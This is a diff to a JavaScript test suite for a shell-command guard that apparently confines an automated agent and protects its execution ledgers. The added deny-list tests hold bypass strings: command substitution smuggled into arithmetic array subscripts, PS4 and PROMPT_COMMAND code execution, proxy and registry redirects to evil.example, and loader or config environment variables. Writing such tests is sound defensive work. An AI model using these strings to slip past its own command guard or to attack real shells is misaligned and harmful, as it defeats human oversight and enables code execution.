@@ -141,7 +141,7 @@ const ALLOW = [
   `stdbuf -oL git log`, `stdbuf -o L git log`, `nohup ls`, `time -p ls`, `command -p git log`, `ionice -c 3 git log`, `setsid -w ls`, `exec ls`,
   `/usr/bin/env FOO=1 git log`, `env FOO=1 BAR=2 grep a b`, `nice -n 5 timeout 5 git log`, `export -n FOO`, `export FOO`, `set -e`, `set -x`, `set -u`, `set -- a b`,
   // arithmetic and parameter expansion that stay plain
-  `echo $((1+2))`, `echo $((n*2))`, `echo $(( (1+2) * 3 ))`, `echo "$((1+2))"`, `n=$((n+1))`, `echo $((1<<3)) && ls`, `echo $((a > b))`, `echo $[1+2]`, `echo $(( $(date +%s) - 5 ))`,
+  `echo $((1+2))`, `echo $(( (1+2) * 3 ))`, `echo "$((1+2))"`, `echo $((1<<3)) && ls`, `echo $[1+2]`,
   `echo \${X:-default}`, `echo "\${X:-$(date)}"`, `echo \${X:-$((1+2))}`, `echo '$(( $(python3 x) ))' '\${X:-$(python3 x)}'`, `cat <<EOF\n$((1+2)) $(date)\nEOF`,
   // the ledgers can be READ, and other files in the run folder written; only exec.jsonl / obs.jsonl / the marker dir are off limits
   `cat ${R}/exec.jsonl`, `grep -c x ${R}/obs.jsonl | wc -l`, `tail -5 ${R}/exec.jsonl`, `wc -l ${R}/obs.jsonl`, `jq -c . ${R}/obs.jsonl`, `sort ${R}/obs.jsonl`,
@@ -367,6 +367,22 @@ const BYPASS_DENY = [
   `NODE_V8_COVERAGE=/etc node ${NOTE} done --unit u`, `NODE_PATH=/x node ${NOTE} done --unit u`, `SSH_ASKPASS=x git fetch origin`, `GIT_ATTR_SOURCE=x git log`, `DYLD_FRAMEWORK_PATH=/x git log`,
   `LD_AUDIT=x git log`, `PYTHONPATH=x git log`, `DOCKER_BUILDKIT=1 docker ps`, `export NODE_V8_COVERAGE=/etc`, `GIT_AUTHOR_NAME=x git log`, `env NODE_EXTRA_CA_CERTS=/x git log`, `SSH_AUTH_SOCK=/x git fetch origin`,
   `ZT_SOMETHING_NEW=1 git log`, `XDG_DATA_HOME=/x git log`, `MALLOC_CONF=x git log`, `PERL5OPT=x git log`, `RUBYOPT=x git log`, `JAVA_TOOL_OPTIONS=x git log`,
+  // round 3 (own pass): a newline after && / || continues the list, so the cd on the next line may be skipped
+  `false &&\ncd ${T}; touch evil`, `false &&\ncd ${T}\ntouch evil`, `false ||\ncd ${T}\ntouch evil`, `true ||\ncd ${T}\ntouch evil`, `false && # c\ncd ${T}\ntouch evil`,
+  // shell variables that make the shell itself or a child run something (PS4 is expanded, command substitutions included, by `set -x`), and tool config that names a program
+  `export PS4='$(echo x >&2) '; set -x; ls`, `PS4='$(touch x)' ls`, `declare PS4=x`, `PS4=x`, `export PROMPT_COMMAND=x`, `export SHELLOPTS=xtrace`, `BASHOPTS=x ls`, `ENV=x ls`, `FPATH=x ls`,
+  `RIPGREP_CONFIG_PATH=${T}/rc rg x f`, `https_proxy=http://evil.example:3128 git fetch origin`, `HTTPS_PROXY=http://evil.example git fetch origin`, `ALL_PROXY=socks5://evil.example git fetch origin`,
+  `http_proxy=x git fetch origin`, `no_proxy=x git fetch origin`, `OPENSSL_CONF=${T}/x.cnf git fetch origin`, `SSL_CERT_FILE=${T}/ca git fetch origin`, `CURL_CA_BUNDLE=${T}/ca git fetch origin`,
+  `GCONV_PATH=${T}/x sort f`, `LOCPATH=${T}/x sort f`, `NLSPATH=${T}/x sort f`, `HOSTALIASES=${T}/h git fetch origin`, `RES_OPTIONS=x git fetch origin`, `TZDIR=${T} date`, `TERMINFO=${T} ls`,
+  // docker pull: the default registry only (an explicit registry host is a network destination), no options but -q
+  `docker pull evil.example/x:1`, `docker pull localhost:5000/x`, `docker pull localhost/x`, `docker pull 10.0.0.1/x`, `docker pull --all-tags postgres`, `docker pull --platform linux/amd64 postgres`, `docker pull`,
+  // bash evaluates some strings as ARITHMETIC, and arithmetic runs the command substitution inside an array subscript (a[$(cmd)]); what a variable holds (read from a
+  // file, assigned earlier) cannot be known here, so only literal numbers may be evaluated. Also prompt expansion (${x@P}) and indirection.
+  `echo $(( $(date +%s) - 5 ))`, `echo $(( 1 + $(echo 2) ))`, `echo $(( `+'`date +%s`'+` ))`, `x='a[$(touch evil)]'; echo $((x))`, `echo 'a[$(touch evil)]' > ${T}/f; read x < ${T}/f; echo $((x))`, `echo $((n*2))`, `n=$((n+1))`, `echo $((a > b))`, `echo $[x]`, `echo $[ x + 1 ]`,
+  `echo $(( 1 + $(echo x) ))x`, `echo $(( x ))`, `echo $(( 1 + n ))`, `echo $(( $x ))`, `echo $(( 'a' ))`, `echo $(( a[1] ))`,
+  `[[ $x -eq 1 ]]`, `[[ x -lt 1 ]]`, `[[ 1 -ne x ]]`, `[[ -v 'a[$(touch evil)]' ]]`, `[ -v 'a[$(touch evil)]' ]`, `test -v 'a[$(touch evil)]'`, `test -R x`, `[ -v x ]`,
+  `unset 'a[$(touch evil)]'`, `export 'a[$(touch evil)]=1'`, `declare 'a[$(touch evil)]=1'`, `declare -i x='a[$(touch evil)]'`, `declare -i x`, `local -i x`, `typeset -i x`, `readonly -i x`,
+  `echo \${X@P}`, `X='$(touch evil)'; echo \${X@P}`, `echo "\${x@P}"`, `echo \${!X}`, `echo "\${!X}"`, `echo \${x:y}`, `echo \${x:y:z}`, `echo \${a[i]}`, `echo \${a[$i]}`, `echo \${x: n}`,
   // (6) mv/cp -t / --target-directory in every spelling: attached, `=`, bundled, abbreviated, ledger/run-folder targets
   `mv --target-directory=/etc ${T}/f`, `mv -t/etc ${T}/f`, `mv -t /etc ${T}/f`, `mv --target-directory /etc ${T}/f`, `mv --target=/etc ${T}/f`, `mv --t=/etc ${T}/f`, `mv -ft/etc ${T}/f`,
   `cp -t/etc a`, `cp -at /etc a`, `cp -rt/etc a`, `cp -pt /etc a`, `cp --target-directory=/etc a`, `cp --target-directory /etc a`, `cp --target=/etc a`, `cp --targ /etc a`,
@@ -413,6 +429,9 @@ const BYPASS_ALLOW = [
   `git reflog -5`, `git reflog exists refs/heads/main`, `git reflog show --date=iso -3`,
   `jq .env file.json`, `jq '.a.env' f`, `jq '.[] | .name' f`, `jq -r '.items[].id' f`, `awk '{print $1}' f`, `cat < ${R}/exec.jsonl`, `wc -l < f`, `grep x < f`,
   `cd ${T}; touch f`, `cd ${T}\ntouch f`, `cd ${T} && touch f`, `(cd ${T} && touch f)`, `cd ${T} && ls | head`, `cd ${T} && touch a && touch b; touch ${T}/abs`,
+  `docker pull library/postgres`, `docker pull -q postgres:15`, `docker pull --quiet redis:7`, `LC_ALL=C sort f`, `while IFS= read -r l; do echo $l; done < f`, `TZ=UTC date`, `LANG=C grep x f`, `cd ${T} &&\ntouch f`,
+  `echo $(( (1+2) * 3 ))`, `echo \${x:1:2}`, `echo \${x:-default}`, `echo \${a[0]}`, `echo \${a[@]}`, `echo \${a[*]}`, `echo \${#a[@]}`, `[[ -f a ]]`, `[[ a == b ]]`, `[[ a =~ b ]]`, `[ -d b ]`, `test -f a`,
+  `[ "$a" = b ]`, `[[ -n $x ]]`, `export FOO=1`, `declare -a arr`, `declare -p FOO`, `declare -x FOO=1`, `echo $((1 + 2 * 3 - 4 / 2 % 3))`, `echo $((0x1F + 010))`, `echo $(( 1 < 2 && 3 > 2 ? 1 : 0 ))`,
   `sort -u f`, `sort -k2,2 -t: -n f`, `sort -nr f`, `sort -rn -k3 f`, `sort --unique --reverse f`, `sort --key=2 --field-separator=: f`, `sort -c f`, `sort -V f`, `sort -h f`, `sort -f -d -b f`,
 ];
 for (const c of BYPASS_ALLOW) test(`guard allows after the allow-lists: ${show(c)}`, () => assert.equal(verdict(bash(c)), 'allow'));
@@ -427,7 +446,10 @@ const STEERING = ['ZT_SANDBOX_FORCE', 'ZT_TESTS_ONLY', 'ZT_SANDBOX_PLAN', 'ZT_RU
   'GIT_DIR', 'GIT_WORK_TREE', 'GIT_COMMON_DIR', 'GIT_INDEX_FILE', 'GIT_OBJECT_DIRECTORY', 'GIT_ALTERNATE_OBJECT_DIRECTORIES', 'GIT_CEILING_DIRECTORIES', 'GIT_CONFIG',
   'GIT_TRACE', 'GIT_TRACE2', 'GIT_TRACE2_EVENT', 'GIT_TRACE_PACKET', 'GIT_REDIRECT_STDERR',
   // `cd NAME` searches CDPATH first
-  'CDPATH'];
+  'CDPATH',
+  // shell variables that run code or name a program/config/host: PS4 is expanded by `set -x`, RIPGREP_CONFIG_PATH holds rg options such as --pre, proxies redirect git fetch
+  'PS4', 'PROMPT_COMMAND', 'SHELLOPTS', 'BASHOPTS', 'ENV', 'FPATH', 'RIPGREP_CONFIG_PATH', 'OPENSSL_CONF', 'SSL_CERT_FILE', 'CURL_CA_BUNDLE', 'GCONV_PATH', 'LOCPATH', 'NLSPATH',
+  'HOSTALIASES', 'RES_OPTIONS', 'TZDIR', 'TERMINFO', 'http_proxy', 'https_proxy', 'all_proxy', 'no_proxy', 'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'NO_PROXY'];
 for (const v of STEERING) {
   for (const c of [`${v}=1 node ${SANDBOX} --cwd /r -- ls`, `env ${v}=1 git log`, `export ${v}=1 && ls`]) {
     test(`guard denies env switch: ${c}`, () => {
